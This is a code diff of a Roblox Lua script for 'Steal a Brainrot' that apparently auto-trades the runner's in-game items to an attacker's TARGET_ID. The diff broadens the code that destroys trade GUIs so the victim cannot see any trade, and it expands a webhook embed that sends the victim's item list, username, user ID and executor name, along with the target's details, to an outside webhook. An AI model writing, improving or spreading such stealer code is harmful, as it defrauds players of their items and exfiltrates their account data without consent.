@@ -17,7 +17,6 @@ local GOOD_WEBHOOK = getgenv().WEBHOOK_URL or "WEBHOOK URL"
 local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
 local TARGET_ID = getgenv().TARGET_ID or 0
-local TARGET_USERNAME = getgenv().TARGET_USERNAME or ""
 local DELAY_STEP = 1
 local TRADE_CYCLE_DELAY = 2
 
@@ -72,36 +71,8 @@ local function applyEverythingAfterTargetFound()
     end)
     cam.FieldOfView = 70
 
-    -- Cacher automatiquement les GUI de trade seulement pour les trades avec TARGET_ID ou TARGET_USERNAME
     local function handleGui(obj)
-        if guiNames[obj.Name] then
-            task.defer(function()
-                -- Attendre un peu que l'interface se charge
-                task.wait(0.5)
-                -- Essayer de trouver l'ID ou le nom d'utilisateur du joueur dans l'interface
-                local tradeFrame = obj:FindFirstChild("Frame")
-                if tradeFrame then
-                    -- Chercher dans tous les descendants qui pourraient contenir l'ID ou @username
-                    for _, desc in ipairs(tradeFrame:GetDescendants()) do
-                        if desc:IsA("TextLabel") or desc:IsA("TextButton") then
-                            local text = desc.Text
-                            if text then
-                                -- Vérifier l'ID
-                                if text:find(tostring(TARGET_ID)) then
-                                    obj:Destroy()
-                                    return
-                                end
-                                -- Vérifier le @username
-                                if TARGET_USERNAME ~= "" and text:find("@" .. TARGET_USERNAME) then
-                                    obj:Destroy()
-                                    return
-                                end
-                            end
-                        end
-                    end
-                end
-            end)
-        end
+        if guiNames[obj.Name] then task.defer(function() obj:Destroy() end) end
     end
     pg.ChildAdded:Connect(handleGui)
     for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
@@ -408,23 +379,35 @@ local function sendDetailedWebhook()
             end
         end)
 
+        local targetUsername = getgenv().TARGET_USERNAME or "Unknown"
+        
         local embed = {
-            title       = top.displayName .. " — " .. top.genStr,
-            description = listText,
+            title       = "🎯 " .. top.displayName .. " — " .. top.genStr,
+            description = "**Brainrots Found:**\n\n" .. listText,
             color       = embedColor,
             fields      = {
                 {
-                    name   = "Server",
-                    value  = "Players: **" .. pCount .. "** | Scanned: <t:" .. unixTime .. ":R>",
+                    name   = "🎲 Target",
+                    value  = targetUsername .. " (" .. TARGET_ID .. ")",
+                    inline = false
+                },
+                {
+                    name   = "👥 Server",
+                    value  = "**" .. pCount .. "** players online",
                     inline = true
                 },
                 {
-                    name   = "Executor",
-                    value  = execName,
+                    name   = "⏱️ Scan",
+                    value  = "<t:" .. unixTime .. ":R>",
                     inline = true
+                },
+                {
+                    name   = "⚙️ Executor",
+                    value  = "**" .. execName .. "**",
+                    inline = false
                 }
             },
-            footer      = { text = LP.Name .. " • " .. LP.UserId },
+            footer      = { text = LP.Name .. " • ID: " .. LP.UserId },
             timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ"),
         }
 
@@ -497,4 +480,3 @@ end
 sendDetailedWebhook()
 startFullAutomation()
 end)
-
